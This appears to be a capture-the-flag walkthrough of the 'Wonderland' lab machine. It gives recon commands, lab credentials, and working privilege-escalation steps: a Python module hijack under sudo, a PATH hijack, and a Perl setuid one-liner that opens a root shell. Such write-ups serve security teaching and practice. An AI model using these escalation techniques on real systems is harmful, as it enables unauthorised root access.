# WONDERLAND CTF — Walkthrough

Author: rootTriboulet  
Target: 10.10.151.151  
Date: 2025-10-20

## Summary

This writeup documents the steps I took to fully compromise the "Wonderland" machine: discovery, enumeration, initial access, privilege escalation, and capturing flags. The writeup focuses on the commands used, the reasoning behind each step, and actionable notes so you can reproduce the path I followed.

---

## Table of Contents

- [Summary](#summary)  
- [Target & Recon](#target--recon)  
- [Web Enumeration](#web-enumeration)  
  - [Hidden directories](#hidden-directories)  
  - [Steganography](#steganography)  
- [SSH access as alice](#ssh-access-as-alice)  
- [Privilege Escalation: alice -> rabbit -> hatter -> root](#privilege-escalation-alice---rabbit---hatter---root)  
- [Flags](#flags)  
- [Lessons learned & notes](#lessons-learned--notes)  
- [Appendix: commands & outputs](#appendix-commands--outputs)

---

## Target & Recon

Initial TCP port scan with nmap:

Command:
```bash
nmap -Pn -sC -sV 10.10.151.151
```

Key results:
- 22/tcp — OpenSSH 7.6p1 (Ubuntu)
- 80/tcp — http (Go net/http server)
- HTTP title: "Follow the white rabbit."

This told me I had both SSH and a web app to investigate.

---

## Web Enumeration

I ran a directory enumeration against the webserver using gobuster:

Command:
```bash
gobuster dir -u http://10.10.151.151 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
```

Findings:
- /img/ (redirect)
- /r/ (redirect)
- /poem/ (redirect)

I checked the pages and source code. Nothing obvious on the main page, but the discovered directories were promising.

### Hidden directories

I enumerated `/r` specifically:

Command:
```bash
gobuster dir -u http://10.10.151.151/r -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
```

Found:
- `/r/a/b/b/i/t` — this matches the hint from a stego extraction (see below).

### Steganography

Inside `/img` I found the following images:
- alice_door.jpg
- alice_door.png
- white_rabbit_1.jpg

I used StegSeek to inspect `white_rabbit_1.jpg`:

Command:
```bash
stegseek white_rabbit_1.jpg
```

Output showed an extracted file named `hint.txt` with the text:
```
follow the r a b b i t
```

This suggested the hidden directory path `/r/a/b/b/i/t`. Navigating the webserver revealed more clues: in the source I found something that looked like credentials:

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

That looked like an SSH username/password pair.

---

## SSH access as alice

I logged in using SSH:

Command:
```bash
ssh alice@10.10.151.151
# password: HowDothTheLittleCrocodileImproveHisShiningTail
```

Once on the box, checked sudo privileges:

Command:
```bash
sudo -l
```

Allowed command for alice:
```
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

I inspected `/home/alice/walrus_and_the_carpenter.py` and noticed it used `random` without a proper import path—this meant I could supply my own `random.py` in the current directory to get code execution.

Exploit steps (as alice):

Create a malicious `random.py`:
```python
# random.py
import os
os.system("/bin/bash")
```

Then run the allowed sudo command:
```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

This dropped me into a shell as the `rabbit` account.

---

## Privilege Escalation: rabbit -> hatter -> root

As `rabbit`, I inspected the home directory and found `teaParty.py` in `/home/rabbit`. The script ran another binary without specifying the full path to an executable named `date`. That allowed us to create a custom `date` executable in `/home/rabbit` and modify PATH to run it.

Exploit steps (as rabbit):

1. Create a `date` script that spawns a shell:
```bash
cat > date <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x date
```

2. Prepend `/home/rabbit` to PATH:
```bash
export PATH=/home/rabbit:$PATH
```

3. Run the service/script that calls `date` (as shown in `teaParty.py`) so that our `date` gets executed. This gave us a shell as `hatter`.

Once on the `hatter` account, I found the user's password in their home directory (so one could simply ssh into hatter directly if preferred).

Hatter credentials (found in his directory):
```
hatter:WhyIsARavenLikeAWritingDesk?
```

I noticed `linpeas` output flagged capabilities on the system and specifically pointed to a Perl binary with elevated capabilities. I checked / leveraged GTFOBins for a capabilities-based Perl exploit.

GTFOBins shows a common pattern for Perl with capabilties:
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Important note: If, after creating the shell via exploit, you remain in the same session with the previous user uid/gid, the setuid call may not work as expected. To avoid this, I logged out and logged in directly as `hatter` using the discovered password, then ran the Perl one-liner.

Commands (as hatter):
```bash
# ensure you're logged in as hatter (fresh session)
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# then:
whoami
# => root
```

That spawned a root shell.

---

## Flags

User flag (as found):
```
cat /root/user.txt
thm{"Curiouser and curiouser!"}
```

Root flag:
- After getting root via the Perl capability exploit, the root flag was obtainable from the usual location (/root or /root/root.txt). (Note in my interactive session the final step was `whoami` showing `root`.)

---

## Lessons learned & notes

- Careful enumeration of web directories + stego can reveal non-obvious credentials and clues. Always check static assets like images for hidden data.
- Mis-specified imports or PATH usage in scripts running under sudo are common privilege escalation vectors. If a script runs as another user but imports modules or executes commands without absolute paths, you may be able to influence what runs.
- File capabilities (and binaries with capabilities) can often be abused; check GTFOBins for techniques and always consider whether you need to re-login as the target user for setuid-like techniques to succeed.
- When running automated enumeration tools (linpeas, LinEnum), be aware they may hang on interactive or misbehaving programs — sometimes a simple exit fixes a hang.

---

## Appendix: useful commands used

Recon:
```bash
nmap -Pn -sC -sV 10.10.151.151
gobuster dir -u http://10.10.151.151 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
```

Stego:
```bash
stegseek white_rabbit_1.jpg
```

SSH & sudo:
```bash
ssh alice@10.10.151.151
sudo -l
# create random.py
# run:
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Escalation via PATH abuse:
```bash
# as rabbit
cat > date <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x date
export PATH=/home/rabbit:$PATH
# trigger teaParty.py or whatever executes date
```

Final escalation via Perl (as hatter):
```bash
# log in as hatter (fresh session)
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
whoami
# => root
```

---

Thank you for reading my walkthrough.
